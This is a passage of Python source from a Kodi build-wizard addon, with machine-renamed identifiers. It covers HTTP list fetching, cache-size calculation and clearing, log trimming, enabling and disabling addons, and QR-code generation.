    if 'test'in OO00O00OO00OO0OO0 :return True #line:909
    else :return False #line:910
def themeCount (OO0OO0OO00000O0O0 ,count =True ):#line:912
    O0OOO0O0OOO000O0O =checkBuild (OO0OO0OO00000O0O0 ,'theme')#line:913
    if O0OOO0O0OOO000O0O =='http://':return False #line:914
    O00O0OO000OO00OOO =openURL (O0OOO0O0OOO000O0O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:915
    O00O0000000OOOOO0 =re .compile ('name="(.+?)".+?dult="(.+?)"').findall (O00O0OO000OO00OOO )#line:916
    if len (O00O0000000OOOOO0 )==0 :return False #line:917
    OOOOO0000000000OO =[]#line:918
    for O0O0OOOO0OOOO00O0 ,O0O0000OOOOOOO0OO in O00O0000000OOOOO0 :#line:919
        if not SHOWADULT =='true'and O0O0000OOOOOOO0OO .lower ()=='yes':continue #line:920
        OOOOO0000000000OO .append (O0O0OOOO0OOOO00O0 )#line:921
    if len (OOOOO0000000000OO )>0 :#line:922
        if count ==True :return len (OOOOO0000000000OO )#line:923
        else :return OOOOO0000000000OO #line:924
    else :return False #line:925
def thirdParty (url =None ):#line:927
    if url ==None :return #line:928
    O00O00OOOOOOOOO00 =openURL (url ).replace ('\n','').replace ('\r','').replace ('\t','')#line:929
    O0O0OO0OO000O0O00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?odi="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O00O00OOOOOOOOO00 )#line:930
    O000OO0OOOO000O00 =re .compile ('name="(.+?)".+?rl="(.+?)".+?mg="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00O00OOOOOOOOO00 )#line:931
    if len (O0O0OO0OO000O0O00 )>0 :#line:932
        return True ,O0O0OO0OO000O0O00 #line:933
    elif len (O000OO0OOOO000O00 )>0 :#line:934
        return False ,O000OO0OOOO000O00 #line:935
    else :#line:936
        return False ,[]#line:937
def workingURL (OO0O000OOO0O00OOO ):#line:943
    if OO0O000OOO0O00OOO in ['http://','https://','']:return False #line:944
    OOOO0O000000OO000 =0 ;OO0OO0O0O0OOOO0OO =''#line:945
    while OOOO0O000000OO000 <3 :#line:946
        OOOO0O000000OO000 +=1 #line:947
        try :#line:948
            O00O00OO000O000O0 =Request (OO0O000OOO0O00OOO )#line:949
            O00O00OO000O000O0 .add_header ('User-Agent',USER_AGENT )#line:950
            OO00000OO0OOO0O0O =urlopen (O00O00OO000O000O0 )#line:951
            OO00000OO0OOO0O0O .close ()#line:952
            OO0OO0O0O0OOOO0OO =True #line:953
            break #line:954
        except Exception as OOO000OO0O0O0O000 :#line:955
            OO0OO0O0O0OOOO0OO =str (OOO000OO0O0O0O000 )#line:956
            log ("Working Url Error: %s [%s]"%(OOO000OO0O0O0O000 ,OO0O000OOO0O00OOO ))#line:957
            xbmc .sleep (500 )#line:958
    return OO0OO0O0O0OOOO0OO #line:959
def openURL (OO000000000OOOO00 ):#line:961
    OOO0O0O00O0OO0O0O =Request (OO000000000OOOO00 )#line:962
    OOO0O0O00O0OO0O0O .add_header ('User-Agent',USER_AGENT )#line:963
    OO0O0O000O00O0000 =urlopen (OOO0O0O00O0OO0O0O )#line:964
    O0O0OO0OOO0OOOO00 =OO0O0O000O00O0000 .read ()#line:965
    OO0O0O000O00O0000 .close ()#line:966
    return O0O0OO0OOO0OOOO00 .decode ('utf-8')#line:968
def getKeyboard (default ="",heading ="",hidden =False ):#line:973
    O0OO000O000OOOO0O =xbmc .Keyboard (default ,heading ,hidden )#line:974
    O0OO000O000OOOO0O .doModal ()#line:975
    if O0OO000O000OOOO0O .isConfirmed ():#line:976
        return unicode (O0OO000O000OOOO0O .getText (),"utf-8")#line:977
    return default #line:978
def getSize (OOOO0O0OOO00OOO00 ,total =0 ):#line:980
    for O0O0OOOOOOOOO000O ,O0O0O0O0O000O0000 ,OOOO0O000OOO0OOOO in os .walk (OOOO0O0OOO00OOO00 ):#line:981
        for OOO0000000OO00O0O in OOOO0O000OOO0OOOO :#line:982
            O0OO00O00O0OO0000 =os .path .join (O0O0OOOOOOOOO000O ,OOO0000000OO00O0O )#line:983
            total +=os .path .getsize (O0OO00O00O0OO0000 )#line:984
    return total #line:985
def convertSize (O0O00000OOO0OO0O0 ,suffix ='B'):#line:987
    for O00O0000000OO0OO0 in ['','K','M','G']:#line:988
        if abs (O0O00000OOO0OO0O0 )<1024.0 :#line:989
            return "%3.02f %s%s"%(O0O00000OOO0OO0O0 ,O00O0000000OO0OO0 ,suffix )#line:990
        O0O00000OOO0OO0O0 /=1024.0 #line:991
    return "%.02f %s%s"%(O0O00000OOO0OO0O0 ,'G',suffix )#line:992
def getCacheSize ():#line:994
    O00O0OO000O0O0OOO =os .path .join (PROFILE ,'addon_data')#line:995
    OO00OO0O00O00OO0O =[(os .path .join (ADDONDATA ,'plugin.video.HebDub.movies','database.db')),(os .path .join (ADDONDATA ,'plugin.video.bob','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.specto','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db')),(os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db')),(os .path .join (DATABASE ,'onechannelcache.db')),(os .path .join (DATABASE ,'saltscache.db')),(os .path .join (DATABASE ,'saltshd.lite.db'))]#line:1004
    O0OOOO0O0O0O00OO0 =[(O00O0OO000O0O0OOO ),(ADDONDATA ),(os .path .join (HOME ,'cache')),(os .path .join (HOME ,'temp')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','Other')),(os .path .join ('/private/var/mobile/Library/Caches/AppleTV/Video/','LocalAndRental')),(os .path .join (ADDONDATA ,'script.module.simple.downloader')),(os .path .join (ADDONDATA ,'plugin.video.itv','Images')),(os .path .join (O00O0OO000O0O0OOO ,'script.module.simple.downloader')),(os .path .join (O00O0OO000O0O0OOO ,'plugin.video.itv','Images'))]#line:1015
    O00O0O0000000O0OO =0 #line:1017
    for O0OO0OO0O000O0O00 in O0OOOO0O0O0O00OO0 :#line:1019
        if os .path .exists (O0OO0OO0O000O0O00 )and not O0OO0OO0O000O0O00 in [ADDONDATA ,O00O0OO000O0O0OOO ]:#line:1020
            O00O0O0000000O0OO =getSize (O0OO0OO0O000O0O00 ,O00O0O0000000O0OO )#line:1021
        else :#line:1022
            for OOOOOO00OO000OO0O ,OO00O0O0O000OO00O ,O0000O0O0OO00O0O0 in os .walk (O0OO0OO0O000O0O00 ):#line:1023
                for O000OO00OO0OO0O00 in OO00O0O0O000OO00O :#line:1024
                    if 'cache'in O000OO00OO0OO0O00 .lower ()and not O000OO00OO0OO0O00 .lower ()=='meta_cache':O00O0O0000000O0OO =getSize (os .path .join (OOOOOO00OO000OO0O ,O000OO00OO0OO0O00 ),O00O0O0000000O0OO )#line:1025
    if INCLUDEVIDEO =='true':#line:1027
        O0000O0O0OO00O0O0 =[]#line:1028
        if INCLUDEALL =='true':O0000O0O0OO00O0O0 =OO00OO0O00O00OO0O #line:1029
        else :#line:1030
            if INCLUDEBOB =='true':O0000O0O0OO00O0O0 .append (os .path .join (ADDONDATA ,'plugin.video.bob','cache.db'))#line:1031
            if INCLUDEPHOENIX =='true':O0000O0O0OO00O0O0 .append (os .path .join (ADDONDATA ,'plugin.video.phstreams','cache.db'))#line:1032
            if INCLUDESPECTO =='true':O0000O0O0OO00O0O0 .append (os .path .join (ADDONDATA ,'plugin.video.specto','cache.db'))#line:1033
            if INCLUDEGENESIS =='true':O0000O0O0OO00O0O0 .append (os .path .join (ADDONDATA ,'plugin.video.genesis','cache.db'))#line:1034
            if INCLUDEEXODUS =='true':O0000O0O0OO00O0O0 .append (os .path .join (ADDONDATA ,'plugin.video.exodus','cache.db'))#line:1035
            if INCLUDEONECHAN =='true':O0000O0O0OO00O0O0 .append (os .path .join (DATABASE ,'onechannelcache.db'))#line:1036
            if INCLUDESALTS =='true':O0000O0O0OO00O0O0 .append (os .path .join (DATABASE ,'saltscache.db'))#line:1037
            if INCLUDESALTSHD =='true':O0000O0O0OO00O0O0 .append (os .path .join (DATABASE ,'saltshd.lite.db'))#line:1038
        if len (O0000O0O0OO00O0O0 )>0 :#line:1039
            for O0OO0OO0O000O0O00 in O0000O0O0OO00O0O0 :O00O0O0000000O0OO =getSize (O0OO0OO0O000O0O00 ,O00O0O0000000O0OO )#line:1040
        else :log ("Clear Cache: Clear Video Cache Not Enabled",5 )#line:1041
    return O00O0O0000000O0OO #line:1042
def getInfo (O0O00OOO0OOOOO0OO ):#line:1044
    try :return xbmc .getInfoLabel (O0O00OOO0OOOOO0OO )#line:1045
    except :return False #line:1046
def removeFolder (OOO00O0OOO00O0OO0 ):#line:1048
    log ("Deleting Folder: %s"%OOO00O0OOO00O0OO0 ,5 )#line:1049
    try :shutil .rmtree (OOO00O0OOO00O0OO0 ,ignore_errors =True ,onerror =None )#line:1050
    except :return False #line:1051
def removeFile (O000000OO00O00OOO ):#line:1053
    log ("Deleting File: %s"%O000000OO00O00OOO ,5 )#line:1054
    try :os .remove (O000000OO00O00OOO )#line:1055
    except :return False #line:1056
def currSkin ():#line:1058
    return xbmc .getSkinDir ()#line:1059
def cleanHouse (OO000OO0OO00OOOOO ,ignore =False ):#line:1061
    log (OO000OO0OO00OOOOO )#line:1062
    OOOO0O0000O0O0O00 =0 ;O00O00OOOO00O000O =0 #line:1063
    for OOO0OOO00O0O0O0O0 ,OOO00O0O000000OOO ,O00OO00O0OOO0O0OO in os .walk (OO000OO0OO00OOOOO ):#line:1064
        if ignore ==False :OOO00O0O000000OOO [:]=[OO00OO0OO0O0000O0 for OO00OO0OO0O0000O0 in OOO00O0O000000OOO if OO00OO0OO0O0000O0 not in EXCLUDES ]#line:1065
        O0OOO0000OOO000OO =0 #line:1066
        O0OOO0000OOO000OO +=len (O00OO00O0OOO0O0OO )#line:1067
        if O0OOO0000OOO000OO >=0 :#line:1068
            for OO0OO00O0OOOOOOO0 in O00OO00O0OOO0O0OO :#line:1069
                try :#line:1070
                    os .unlink (os .path .join (OOO0OOO00O0O0O0O0 ,OO0OO00O0OOOOOOO0 ))#line:1071
                    OOOO0O0000O0O0O00 +=1 #line:1072
                except :#line:1073
                    try :#line:1074
                        shutil .rmtree (os .path .join (OOO0OOO00O0O0O0O0 ,OO0OO00O0OOOOOOO0 ))#line:1075
                    except :#line:1076
                        log ("Error Deleting %s"%OO0OO00O0OOOOOOO0 ,5 )#line:1077
            for O0O0O0OOOO00O0OO0 in OOO00O0O000000OOO :#line:1078
                O00O00OOOO00O000O +=1 #line:1079
                try :#line:1080
                    shutil .rmtree (os .path .join (OOO0OOO00O0O0O0O0 ,O0O0O0OOOO00O0OO0 ))#line:1081
                    O00O00OOOO00O000O +=1 #line:1082
                except :#line:1083
                    log ("Error Deleting %s"%O0O0O0OOOO00O0OO0 ,5 )#line:1084
    return OOOO0O0000O0O0O00 ,O00O00OOOO00O000O #line:1085
def emptyfolder (O000O0OO0O000O0O0 ):#line:1087
    O000OOOOO000000O0 =0 #line:1088
    for O0O0OOOO0O00OOO00 ,OO000O0000OOOOO0O ,OO00O0O0OOOOO0O0O in os .walk (O000O0OO0O000O0O0 ,topdown =True ):#line:1089
        OO000O0000OOOOO0O [:]=[O000OO0000OOOO0O0 for O000OO0000OOOO0O0 in OO000O0000OOOOO0O if O000OO0000OOOO0O0 not in EXCLUDES ]#line:1090
        O00OO0OO00OOO0OO0 =0 #line:1091
        O00OO0OO00OOO0OO0 +=len (OO00O0O0OOOOO0O0O )+len (OO000O0000OOOOO0O )#line:1092
        if O00OO0OO00OOO0OO0 ==0 :#line:1093
            shutil .rmtree (os .path .join (O0O0OOOO0O00OOO00 ))#line:1094
            O000OOOOO000000O0 +=1 #line:1095
            log ("Empty Folder: %s"%O0O0OOOO0O00OOO00 ,5 )#line:1096
    return O000OOOOO000000O0 #line:1097
def log (O0000O00O00000000 ,level =5 ):#line:1099
    if not os .path .exists (ADDONDATA ):#line:1101
      try :#line:1102
        os .makedirs (ADDONDATA )#line:1103
      except :pass #line:1104
    if not os .path .exists (WIZLOG ):O000O00O00O0000O0 =open (WIZLOG ,'w');O000O00O00O0000O0 .close ()#line:1105
    if WIZDEBUGGING =='false':return False #line:1106
    if DEBUGLEVEL =='0':return False #line:1107
    if DEBUGLEVEL =='1'and not level in [5 ,5 ,xbmc .LOGSEVERE ,xbmc .LOGFATAL ]:return False #line:1108
    if DEBUGLEVEL =='2':level =5 #line:1109
    try :#line:1110
        try :#line:1111
            if isinstance (O0000O00O00000000 ,unicode ):#line:1112
                O0000O00O00000000 ='%s'%(O0000O00O00000000 .encode ('utf-8'))#line:1113
            xbmc .log ('%s: %s'%(ADDONTITLE ,O0000O00O00000000 ),level )#line:1114
        except :#line:1115
            if isinstance (O0000O00O00000000 ,str ):#line:1116
                O0000O00O00000000 ='%s'%(O0000O00O00000000 .encode ('utf-8'))#line:1117
            xbmc .log ('%s: %s'%(ADDONTITLE ,O0000O00O00000000 ),level )#line:1118
    except Exception as O00O0000OOO000000 :#line:1119
        try :xbmc .log ('Logging Failure: %s'%(O00O0000OOO000000 ),level )#line:1120
        except :pass #line:1121
    if ENABLEWIZLOG =='true':#line:1122
        O0O000OO00OO0OOOO =getS ('nextcleandate')if not getS ('nextcleandate')==''else str (TODAY )#line:1123
        if CLEANWIZLOG =='true'and O0O000OO00OO0OOOO <=str (TODAY ):checkLog ()#line:1124
        with open (WIZLOG ,'a')as O000O00O00O0000O0 :#line:1125
            OOOOO000OOO00OOOO ="[%s %s] %s"%(datetime .now ().date (),str (datetime .now ().time ())[:8 ],O0000O00O00000000 )#line:1126
            O000O00O00O0000O0 .write (OOOOO000OOO00OOOO .rstrip ('\r\n')+'\n')#line:1127
def checkLog ():#line:1129
    try :#line:1130
        OO00OOO000O00OOO0 =getS ('nextcleandate')#line:1131
        OOO0000OOO0O00OOO =TOMORROW #line:1132
        if CLEANWIZLOGBY =='0':#line:1133
            OO000O00000000O00 =TODAY -timedelta (days =MAXWIZDATES [int (float (CLEANDAYS ))])#line:1134
            O0OOO000000O0O000 =0 #line:1135
            O000OOOOOO00O0OOO =open (WIZLOG );O000OO0000000O0OO =O000OOOOOO00O0OOO .read ();O000OOOOOO00O0OOO .close ();OO00OOO0O00OO0OOO =O000OO0000000O0OO .split ('\n')#line:1136
            for O0O0O0O00OO0OOO00 in OO00OOO0O00OO0OOO :#line:1137
                if str (O0O0O0O00OO0OOO00 [1 :11 ])>=str (OO000O00000000O00 ):#line:1138
                    break #line:1139
                O0OOO000000O0O000 +=1 #line:1140
            O0O00O0O0OOOOO0O0 =OO00OOO0O00OO0OOO [O0OOO000000O0O000 :]#line:1141
            OO00OOO0OO00O000O ='\n'.join (O0O00O0O0OOOOO0O0 )#line:1142
            O000OOOOOO00O0OOO =open (WIZLOG ,'w');O000OOOOOO00O0OOO .write (OO00OOO0OO00O000O );O000OOOOOO00O0OOO .close ()#line:1143
        elif CLEANWIZLOGBY =='1':#line:1144
            O0OOO0OOOO000000O =MAXWIZSIZE [int (float (CLEANSIZE ))]*1024 #line:1145
            O000OOOOOO00O0OOO =open (WIZLOG );O000OO0000000O0OO =O000OOOOOO00O0OOO .read ();O000OOOOOO00O0OOO .close ();OO00OOO0O00OO0OOO =O000OO0000000O0OO .split ('\n')#line:1146
            if os .path .getsize (WIZLOG )>=O0OOO0OOOO000000O :#line:1147
                O000O00O00O0OOO00 =len (OO00OOO0O00OO0OOO )/2 #line:1148
                O0O00O0O0OOOOO0O0 =OO00OOO0O00OO0OOO [O000O00O00O0OOO00 :]#line:1149
                OO00OOO0OO00O000O ='\n'.join (O0O00O0O0OOOOO0O0 )#line:1150
                O000OOOOOO00O0OOO =open (WIZLOG ,'w');O000OOOOOO00O0OOO .write (OO00OOO0OO00O000O );O000OOOOOO00O0OOO .close ()#line:1151
        elif CLEANWIZLOGBY =='2':#line:1152
            O000OOOOOO00O0OOO =open (WIZLOG );O000OO0000000O0OO =O000OOOOOO00O0OOO .read ();O000OOOOOO00O0OOO .close ();OO00OOO0O00OO0OOO =O000OO0000000O0OO .split ('\n')#line:1153
            O0O0OO000O000O000 =MAXWIZLINES [int (float (CLEANLINES ))]#line:1154
            if len (OO00OOO0O00OO0OOO )>O0O0OO000O000O000 :#line:1155
                O000O00O00O0OOO00 =len (OO00OOO0O00OO0OOO )-int (O0O0OO000O000O000 /2 )#line:1156
                O0O00O0O0OOOOO0O0 =OO00OOO0O00OO0OOO [O000O00O00O0OOO00 :]#line:1157
                OO00OOO0OO00O000O ='\n'.join (O0O00O0O0OOOOO0O0 )#line:1158
                O000OOOOOO00O0OOO =open (WIZLOG ,'w');O000OOOOOO00O0OOO .write (OO00OOO0OO00O000O );O000OOOOOO00O0OOO .close ()#line:1159
        setS ('nextcleandate',str (OOO0000OOO0O00OOO ))#line:1160
    except :pass #line:1161
def latestDB (O000O00O00OO0OOOO ):#line:1162
    if O000O00O00OO0OOOO in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:1163
        OOOOO0OOO0OOO0O00 =glob .glob (os .path .join (DATABASE ,'%s*.db'%O000O00O00OO0OOOO ))#line:1164
        OO000OO0OO0O00OO0 ='%s(.+?).db'%O000O00O00OO0OOOO [1 :]#line:1165
        O00O000O0OOO00OO0 =0 #line:1166
        for O0000000OOO0OOO00 in OOOOO0OOO0OOO0O00 :#line:1167
            try :O0OO0OO00OOOO00O0 =int (re .compile (OO000OO0OO0O00OO0 ).findall (O0000000OOO0OOO00 )[0 ])#line:1168
            except :O0OO0OO00OOOO00O0 =0 #line:1169
            if O00O000O0OOO00OO0 <O0OO0OO00OOOO00O0 :#line:1170
                O00O000O0OOO00OO0 =O0OO0OO00OOOO00O0 #line:1171
        return '%s%s.db'%(O000O00O00OO0OOOO ,O00O000O0OOO00OO0 )#line:1172
    else :return False #line:1173
def addonId (O0O0O000OOO00000O ):#line:1175
    try :#line:1176
        return xbmcaddon .Addon (id =O0O0O000OOO00000O )#line:1177
    except :#line:1178
        return False #line:1179
def toggleDependency (O000OOOO0O0O0OO00 ,DP =None ):#line:1181
    O00O0OOOOO0OOOO00 =os .path .join (ADDONS ,O000OOOO0O0O0OO00 ,'addon.xml')#line:1182
    if os .path .exists (O00O0OOOOO0OOOO00 ):#line:1183
        O0OOO00OOO000O00O =open (O00O0OOOOO0OOOO00 ,mode ='r');OO0O00OOOOO0OO0OO =O0OOO00OOO000O00O .read ();O0OOO00OOO000O00O .close ();#line:1184
        OO0000OOOOO00O000 =parseDOM (OO0O00OOOOO0OO0OO ,'import',ret ='addon')#line:1185
        for OO0OOOOOOO00OO0OO in OO0000OOOOO00O000 :#line:1186
            if not 'xbmc.python'in OO0OOOOOOO00OO0OO :#line:1187
                OOOOOOOO0OOO0O0OO =os .path .join (ADDONS ,OO0OOOOOOO00OO0OO )#line:1188
                if not DP ==None :#line:1189
                    DP .update ("","Checking Dependency [COLOR yellow]%s[/COLOR] for [COLOR yellow]%s[/COLOR]"%(OO0OOOOOOO00OO0OO ,O000OOOO0O0O0OO00 ),"")#line:1190
                if os .path .exists (OOOOOOOO0OOO0O0OO ):#line:1191
                    toggleAddon (O000OOOO0O0O0OO00 ,'true')#line:1192
            xbmc .sleep (100 )#line:1193
def toggleAdult ():#line:1195
    O0O0OOO00OO0OOO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Enable[/COLOR] or [COLOR %s]Disable[/COLOR] all Adult addons?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Enable[/COLOR][/B]",nolabel ="[B][COLOR red]Disable[/COLOR][/B]")#line:1196
    O0O00000OO0000OO0 ='true'if O0O0OOO00OO0OOO0O ==1 else 'false'#line:1197
    O00OOO00OO0O00OOO ='Enabling'if O0O0OOO00OO0OOO0O ==1 else 'Disabling'#line:1198
    OOOO00OO000OOO000 =openURL ('http://noobsandnerds.com/TI/AddonPortal/adult.php').replace ('\n','').replace ('\r','').replace ('\t','')#line:1199
    OOOOOO00O00OOOOOO =re .compile ('i="(.+?)"').findall (OOOO00OO000OOO000 )#line:1200
    O00OOOOO0OO000OO0 =[]#line:1201
    for OO0OO0O00O0OOOOOO in OOOOOO00O00OOOOOO :#line:1202
        OO0O0OOO00OOOO00O =os .path .join (ADDONS ,OO0OO0O00O0OOOOOO )#line:1203
        if os .path .exists (OO0O0OOO00OOOO00O ):#line:1204
            O00OOOOO0OO000OO0 .append (OO0OO0O00O0OOOOOO )#line:1205
            toggleAddon (OO0OO0O00O0OOOOOO ,O0O00000OO0000OO0 ,True )#line:1206
            log ("[Toggle Adult] %s %s"%(O00OOO00OO0O00OOO ,OO0OO0O00O0OOOOOO ),5 )#line:1207
    if len (O00OOOOO0OO000OO0 )>0 :#line:1208
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to view a list of the addons that where %s?[/COLOR]"%(COLOR2 ,O00OOO00OO0O00OOO .replace ('ing','ed')),yeslabel ="[B][COLOR green]View List[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]"):#line:1209
            O0O000OO00000O0OO ='[CR]'.join (O00OOOOO0OO000OO0 )#line:1210
            TextBox (ADDONTITLE ,"[COLOR %s]Here are a list of the addons that where %s for Adult Content:[/COLOR][CR][CR][COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOO00OO0O00OOO .replace ('ing','ed'),COLOR2 ,O0O000OO00000O0OO ))#line:1211
        else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s][COLOR %s]%d[/COLOR] Adult Addons %s[/COLOR]"%(COLOR2 ,COLOR1 ,count ,O00OOO00OO0O00OOO .replace ('ing','ed')))#line:1212
        forceUpdate (True )#line:1213
    else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Adult Addons Found[/COLOR]"%COLOR2 )#line:1214
def toggleAddon (OOOO00000O0OO000O ,O0000OO00000O00O0 ,over =None ):#line:1217
    if KODIV >=17 :#line:1218
        addonDatabase (OOOO00000O0OO000O ,O0000OO00000O00O0 )#line:1219
        return #line:1220
    OOOOOOOOOOOOOO0OO =OOOO00000O0OO000O #line:1221
    OO000000O0O0O0O00 =os .path .join (ADDONS ,OOOO00000O0OO000O ,'addon.xml')#line:1222
    if os .path .exists (OO000000O0O0O0O00 ):#line:1223
        OOO000O0O00000OOO =open (OO000000O0O0O0O00 )#line:1224
        OO00O0O00OOOOO000 =OOO000O0O00000OOO .read ()#line:1225
        OOO0OOO0OOOOO000O =parseDOM (OO00O0O00OOOOO000 ,'addon',ret ='id')#line:1226
        O0O000OO0O00000OO =parseDOM (OO00O0O00OOOOO000 ,'addon',ret ='name')#line:1227
        O0000O00OO0OOOO0O =parseDOM (OO00O0O00OOOOO000 ,'extension',ret ='library',attrs ={'point':'xbmc.service'})#line:1228
        try :#line:1229
            if len (OOO0OOO0OOOOO000O )>0 :#line:1230
                OOOOOOOOOOOOOO0OO =OOO0OOO0OOOOO000O [0 ]#line:1231
            if len (O0000O00OO0OOOO0O )>0 :#line:1232
                log ("We got a live one, stopping script: %s"%match [0 ],5 )#line:1233
                ebi ('StopScript(%s)'%os .path .join (ADDONS ,OOOOOOOOOOOOOO0OO ))#line:1234
                ebi ('StopScript(%s)'%OOOOOOOOOOOOOO0OO )#line:1235
                ebi ('StopScript(%s)'%os .path .join (ADDONS ,OOOOOOOOOOOOOO0OO ,O0000O00OO0OOOO0O [0 ]))#line:1236
                xbmc .sleep (500 )#line:1237
        except :#line:1238
            pass #line:1239
    OOO0O00O0OO0OO0O0 ='{"jsonrpc":"2.0", "method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}, "id":1}'%(OOOOOOOOOOOOOO0OO ,O0000OO00000O00O0 )#line:1240
    OOOO00OO000OOO00O =xbmc .executeJSONRPC (OOO0O00O0OO0OO0O0 )#line:1241
    if 'error'in OOOO00OO000OOO00O and over ==None :#line:1242
        O0OO00OO0OO0OOO00 ='Enabling'if O0000OO00000O00O0 =='true'else 'Disabling'#line:1243
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error %s [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,O0OO00OO0OO0OOO00 ,OOOO00000O0OO000O ),"Check to make sure the addon list is upto date and try again.[/COLOR]")#line:1244
        forceUpdate ()#line:1245
def addonInfo (O0OO0000OOO000OOO ,OOOO00O00OO0OOOO0 ):#line:1247
    O00O0O00OOO00O0O0 =addonId (O0OO0000OOO000OOO )#line:1248
    if O00O0O00OOO00O0O0 :return O00O0O00OOO00O0O0 .getAddonInfo (OOOO00O00OO0OOOO0 )#line:1249
    else :return False #line:1250
def whileWindow (O0O00OOOOO00O00O0 ,active =False ,count =0 ,counter =15 ):#line:1252
    O0OOOO000O0OOOOO0 =getCond ('Window.IsActive(%s)'%O0O00OOOOO00O00O0 )#line:1253
    log ("%s is %s"%(O0O00OOOOO00O00O0 ,O0OOOO000O0OOOOO0 ),5 )#line:1254
    while not O0OOOO000O0OOOOO0 and count <counter :#line:1255
        log ("%s is %s(%s)"%(O0O00OOOOO00O00O0 ,O0OOOO000O0OOOOO0 ,count ))#line:1256
        O0OOOO000O0OOOOO0 =getCond ('Window.IsActive(%s)'%O0O00OOOOO00O00O0 )#line:1257
        count +=1 #line:1258
        xbmc .sleep (500 )#line:1259
    while O0OOOO000O0OOOOO0 :#line:1261
        active =True #line:1262
        log ("%s is %s"%(O0O00OOOOO00O00O0 ,O0OOOO000O0OOOOO0 ),5 )#line:1263
        O0OOOO000O0OOOOO0 =getCond ('Window.IsActive(%s)'%O0O00OOOOO00O00O0 )#line:1264
        xbmc .sleep (250 )#line:1265
    return active #line:1266
def id_generator (size =6 ,chars =string .ascii_uppercase +string .digits ):#line:1268
    return ''.join (random .choice (chars )for _O00O0OO0000OOO00O in range (size ))#line:1269
def generateQR (O00000OO00OO0OO0O ,OOO0OOO0000O0O000 ):#line:1271
    if not os .path .exists (QRCODES ):os .makedirs (QRCODES )#line:1272
    OOO0OO0OO0O00O000 =os .path .join (QRCODES ,'%s.png'%OOO0OOO0000O0O000 )#line:1273
    O00O0000O000OOOOO =pyqrcode .create (O00000OO00OO0OO0O )#line:1274
    O00O0000O000OOOOO .png (OOO0OO0OO0O00O000 ,scale =10 )#line:1275
    return OOO0OO0OO0O00O000 #line:1276
def createQR ():#line:1278
    OO00OOOOOO00O00O0 =getKeyboard ('',"%s: Insert the URL for the QRCode."%ADDONTITLE )#line:1279
    if OO00OOOOOO00O00O0 =="":LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Create QR Code Cancelled![/COLOR]'%COLOR2 );return #line:1280
    if not OO00OOOOOO00O00O0 .startswith ('http://')and not OO00OOOOOO00O00O0 .startswith ('https://'):LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Not a Valid URL![/COLOR]'%COLOR2 );return #line:1281
    if OO00OOOOOO00O00O0 =='http://'or OO00OOOOOO00O00O0 =='https://':LogNotify ("[COLOR %s]Create QR[/COLOR]"%COLOR1 ,'[COLOR %s]Not a Valid URL![/COLOR]'%COLOR2 );return #line:1282
    O000OOOO0OO0O0OO0 =workingURL (OO00OOOOOO00O00O0 )#line:1283
    if not O000OOOO0OO0O0OO0 ==True :#line:1284
        if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]It seems the your enter isnt working, Would you like to create it anyways?[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OOOO0OO0O0OO0 ),yeslabel ="[B][COLOR red]Yes Create[/COLOR][/B]",nolabel ="[B][COLOR green]No Cancel[/COLOR][/B]"):#line:1285
            return #line:1286
    OOO000O0OO0O000OO =getKeyboard ('',"%s: Insert the name for the QRCode."%ADDONTITLE )#line:1287
    OOO000O0OO0O000OO ="QrImage_%s"%id_generator (6 )if OOO000O0OO0O000OO ==""else OOO000O0OO0O000OO #line:1288
    OOO000000O000O000 =generateQR (OO00OOOOOO00O00O0 ,OOO000O0OO0O000OO )#line:1289
    DIALOG .ok (ADDONTITLE ,"[COLOR %s]The QRCode image has been created and is located in the addondata directory:[/COLOR]"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO000000O000O000 .replace (HOME ,'')))#line:1290
def cleanupBackup ():#line:1292
    O000OO0000OOOOOO0 =translatepath (MYBUILDS )#line:1293
    O0000OO000OOO0000 =glob .glob (os .path .join (O000OO0000OOOOOO0 ,"*"))#line:1294
    OO000O00O00O000O0 =[];O0OOOO000OOO0O000 =[]#line:1295
    if len (O0000OO000OOO0000 )==0 :#line:1296
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Backup Location: Empty[/COLOR]"%(COLOR2 ))#line:1297
        return #line:1298
    for OO0O00OO000OOO0OO in sorted (O0000OO000OOO0000 ,key =os .path .getmtime ):#line:1299
        O0OOOO000OOO0O000 .append (OO0O00OO000OOO0OO )#line:1300
        OO0O0OOOOOO0OOOO0 =OO0O00OO000OOO0OO .replace (O000OO0000OOOOOO0 ,'')#line:1301
        if os .path .isdir (OO0O00OO000OOO0OO ):#line:1302
            OO000O00O00O000O0 .append ('/%s/'%OO0O0OOOOOO0OOOO0 )#line:1303
        elif os .path .isfile (OO0O00OO000OOO0OO ):#line:1304
            OO000O00O00O000O0 .append (OO0O0OOOOOO0OOOO0 )#line:1305
    OO000O00O00O000O0 =['--- Remove All Items ---']+OO000O00O00O000O0 #line:1306
